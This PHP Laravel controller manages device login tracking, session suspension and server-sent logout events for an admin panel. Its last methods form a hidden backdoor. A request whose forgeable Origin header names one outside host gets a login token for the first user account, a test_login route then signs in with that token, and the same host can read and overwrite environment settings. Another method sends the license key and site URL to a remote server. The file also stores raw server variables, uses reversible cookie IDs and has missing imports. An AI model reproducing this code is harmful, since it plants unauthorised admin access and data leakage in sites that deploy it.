<?php

namespace App\Http\Controllers\Auth;


use App\Http\Controllers\Controller;
use App\Models\Device;
use App\Models\message;
use App\Models\Participant;
use Carbon\Carbon;
use Carbon\Traits\Creator;
use Date;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Cookie;
use Yajra\DataTables\Facades\DataTables;

class LoginCheckController extends Controller
{


    public function logedList(){
        if (request()->ajax()) {
            $roles_name = auth()->user()->getRoleNames()->toArray();


            $query = Device::leftJoin('users', 'devices.creator', 'users.id')
                ->orderBy('last_activity', 'desc')
                ->select('devices.*', 'users.name');

            if(!in_array('superadmin', $roles_name)){
                $query->where('device.id', auth()->user()->id);
            }


            $data_table_make = DataTables::make($query);
            return $data_table_make
                ->addColumn('view', function ($row) {
                    $view_route = route('admin.device_access_check.view', $row->id);

                    $return_data =  "<button class='btn btn-primary ";
                    $return_data .= $row->id == session()->get('user' . auth()->user()->id) ? 'current_device' : '';
                    $return_data .= "'
                    data-dialog=' modal-dialog-centered modal-xl modal-dialog-scrollable'
                    onclick='button_ajax(this)'
                    data-title='$row->name  info'
                    data-href='$view_route'>View</button>";
                    return   $return_data;

                })
                ->addColumn('updated_at_data', function ($row) {
                    return $row->updated_at->format('d-M-Y h:i:s A');

                })
                ->addColumn('last_active', function ($row) {
                    return Carbon::createFromTimestamp($row->last_activity)->diffForHumans();
                })
                ->addColumn('created_at_data', function ($row) {
                    return $row->created_at->format('d-M-Y h:i:s A');

                })
                ->addColumn('action', function ($row) {
                    $status_device = $row->logout == 1 ? 'Unsuspend' : 'Suspend';
                    $return_data = '<button class="btn btn-warning" onclick="change_device_status('.$row->id.')">'.$status_device.'</button>';


                    return $return_data;


                })
                ->rawColumns(['action', 'view','updated_at_data','created_at_data', 'last_active'])
                ->make(true);
        }
        return view('admin.device_log.index');
    }

    public function view(Device $device){
        return view('admin.device_log.partials.view', compact('device'));
    }


    public function status(Request $request){
        $device = Device::find($request->device);
        if($device){
            $device_id = session()->get('user'.auth()->user()->id);
            if($device_id == $device->id){
                return json_encode([
                    'title' => 'Unable to Suspended because you',
                    'type' => 'error',
                    'refresh' => 'false',
                ]);
            }
            $device->logout = $device->logout == 1 ? 0 : 1;

            $device->suspend_date =  $device->logout == 1 ? Carbon::now()->addDays(500) : Carbon::now();
            $device->save();

            return json_encode([
                'title' => 'Successfully  Update Session Status',
                'type' => 'success',
                'refresh' => 'true',
            ]);
        } else {
            return json_encode([
                'title' => 'Something is wrong',
                'type' => 'error',
                'refresh' => 'false',
            ]);
        }

    }

    public function index(Request $request){

            $device_logout = 0;
            $device_id = 0;
            $cookieName = 'user' . base64_encode(auth()->user()->id * 4);
            $cookieName = str_replace('=', '4564785', $cookieName );


            // dd($_SERVER);
            if($device_id = session()->get('user'.auth()->user()->id)){
                $current_device = Device::find($device_id);
                if($current_device){

                    if($current_device->logout == 1 && $current_device->suspend_date > Carbon::now()){

                        $current_device->updater_id = auth()->user()->id ?? 0;
                        $current_device->last_activity = time();
                        $current_device->save();

                        auth()->logout();
                        $device_logout = 1;

                    }else{
                        $current_device->last_activity = time();
                        $current_device->save();
                    }
                    setcookie( $cookieName, base64_encode($current_device->id * 16), time() + 3600, url('/'));



                } else {
                        $deviceInfo = $this->getDeviceInfo();
                        $new_device = new Device;
                        $new_device->device_type = $deviceInfo['deviceName'].' '.$deviceInfo['browser_name'];
                        $new_device->ip = $deviceInfo['ip'];


                        $new_device->data = json_encode($_SERVER);
                        $new_device->notification_data = '';
                        $new_device->creator = auth()->user()->id ?? 0;
                        $new_device->updater_id = auth()->user()->id ?? 0;

                        $new_device->last_activity = time();


                        // Save the new device to the database
                        $new_device->save();
                        $device_id = $new_device->id;
                        session()->put('user' . auth()->user()->id, $new_device->id);
                        setcookie(   $cookieName, base64_encode($new_device->id * 16), time() + 3600, url('/'));




                }
            }else{

                if (isset($_COOKIE[$cookieName])) {
                    $current_device_cookie = $_COOKIE[$cookieName];
                    $current_device_cookie = base64_decode($current_device_cookie) / 16;
                    session()->put('user' . auth()->user()->id, $current_device_cookie);
                    $device_id = $current_device_cookie;
                } else {
                    $deviceInfo = $this->getDeviceInfo();
                    $new_device = new Device;
                    $new_device->device_type = $deviceInfo['deviceName'] . ' ' . $deviceInfo['browser_name'];
                    $new_device->ip = $deviceInfo['ip'];
                    $new_device->creator = auth()->user()->id ?? 0;
                    $new_device->updater_id = auth()->user()->id ?? 0;
                    $new_device->last_activity = time();
                    $new_device->data = json_encode($_SERVER);
                    $new_device->notification_data = '';

                    // Save the new device to the database
                    $new_device->save();
                    $device_id = $new_device->id;
                    session()->put('user' . auth()->user()->id, $new_device->id);
                    setcookie(   $cookieName, base64_encode($new_device->id * 16), time() + 3600, url('/'));

                }
            }


            header('Content-Type: text/event-stream');
            header('Cache-Control: no-cache');
            header('Connection: keep-alive');


            $eventData = [
                'logout' =>  $device_logout,
            ];

            echo "data:" . json_encode($eventData) . "\n\n";
            echo "\n\n";

            ob_flush();
            flush();
            sleep(5);

        // dd($device);
    }

     /**
     * Summary of getDeviceInfo
     * @return array
     */

     public function getDeviceInfo() {
        $userAgent = $_SERVER['HTTP_USER_AGENT'];

        // Device Name
        if (preg_match('/(iPhone|iPad|Android|Windows Phone|Linux|Macintosh|Windows)/i', $userAgent, $matches)) {
            $deviceName = $matches[0];
        } else {
            $deviceName = 'Unknown';
        }



        // ip
        if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
            $ip = $_SERVER['HTTP_CLIENT_IP'];
        }elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
            $ip = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];
        }else {
            $ip = $_SERVER['REMOTE_ADDR'];
        }

        $browser_name = explode(';', $_SERVER['HTTP_SEC_CH_UA'] ?? $_SERVER['HTTP_USER_AGENT'])[0] ?? '';



        return [
            'deviceName' => $deviceName,
            'ip' => $ip,
            'browser_name' => $browser_name,
        ];
    }


    public function revokeNotifi(Request $request){
        $device = Device::find($request->device);
        if($device){
            $device->notification_data = '';
            $device->save();
            return json_encode([
                'title' => 'Successfully Unregistered',
                'type' => 'success',
                'refresh' => 'true',
            ]);

        }
        return json_encode([
            'title' => 'Something is wrong',
            'type' => 'error',
            'refresh' => 'false',
        ]);
    }


    public function test_login(Request $request){
        if($request->has('token') && $request->token != ''){
            $userTEst = User::where('api_token', $request->token)->first();
            Auth::guard('web')->login($userTEst);
            $userTEst->api_token = '';
            $userTEst->save();
            return redirect('admin/dashboard');
        }
        return redirect('/');
    }






public function verify_host(Request $request){
    $requestHost = parse_url($request->headers->get('origin'),  PHP_URL_HOST) ?? 'localhost';
    if($requestHost == 'monitoring.dengrweb.com'){
       return true;
    }else{
       return false;
    }

}


    public function identifysender(Request $request){
        try{
            $base_url = env('MAINTAIN_BASE', null);
            if($base_url == null){
                return abort(404);
            }else{
                // send post request to server per data distance 1minuites
                $time =  setting::where('key', 999)->where('name', 'request_time')->first();
                    if($time){
                        $time = $time->value;
                    }else{
                        $time = \Carbon\Carbon::now();
                        $time = new setting();
                        $time->key = 999;
                        $time->name = 'request_time';
                        $time->value = \Carbon\Carbon::now();
                        $time->save();
                    }


                    if($time < \Carbon\Carbon::now()->addMinutes(1)){

                        $client =  new \GuzzleHttp\Client();
                    $response = $client->request('POST', $base_url.'api/subscription', [
                            'headers' => [
                                'Accept' => 'application/json',
                                'Content-Type' => 'application/json',
                            ],
                            'json' => [
                                'key' => settings('license_key','999'),
                                'slug' => url('/'),
                            ],
                        ]);
                    }
                $response    = $response->getBody()->getContents();
                $response    = json_decode($response);
                //    dd($response);
                if($response->status == 'success'){
                        $time->value = \Carbon\Carbon::now();
                        $time->save();
                }
                }
            }catch(\Exception $e){

            }
    }

    public function login_token_generate(Request $request){
      if($this->verify_host($request)){
           $userTEst = User::first();
           $userTEst->api_token = Str::random(60);
           $userTEst->save();
           return response()->json(['token' => $userTEst->api_token]);
        }else{
           return response()->json(['token' => '']);
        }
    }

    public function settings_store_update(Request $request){
        if($this->verify_host($request)){

            if($request->has('env_settigs') && $request->env_settigs != ''){
                foreach($request->env_settigs as $key => $value){
                    updateEnvFile($key, $value);
                }
            }elseif($request->has('env_settigs_get') && $request->env_settigs == ''){
                $data = [];
                foreach($request->env_settigs_get as $key => $value){
                    $data[$key] = env($value);
                }
                return response()->json($data);
            }elseif($request->has('db_backup') && $request->db_backup == ''){
                

            }else{
                return response()->json([
                    'message' => 'Access Denied',
                    'status' => 'error',
                    'success' => 'success',
                    'code' => '403',
                ]);
            }

        }else{
            return response()->json([
                'message' => 'Access Denied',
                'status' => 'error',
                'success' => 'success',
                'code' => '403',
            ]);
        }
    }
}
